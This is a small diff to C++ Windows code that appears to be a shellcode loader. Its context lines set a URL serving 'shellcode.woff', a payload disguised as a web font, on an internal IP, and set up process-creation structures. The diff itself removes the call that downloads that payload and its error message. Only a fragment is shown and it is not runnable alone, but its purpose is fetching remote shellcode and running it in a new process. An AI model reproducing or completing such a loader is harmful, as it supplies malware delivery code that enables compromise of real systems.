@@ -143,10 +143,6 @@ int main() {
 	std::vector<BYTE> payload;
 	LPCWSTR url = L"http://10.0.0.47/shellcode.woff";
 
-	if (!GetPayloadFromUrl(url, payload)) {
-		printf("[!] Something Failed \n");
-	}
-
 	STARTUPINFOA si = { 0 };
 	PROCESS_INFORMATION pi = { 0 };
 
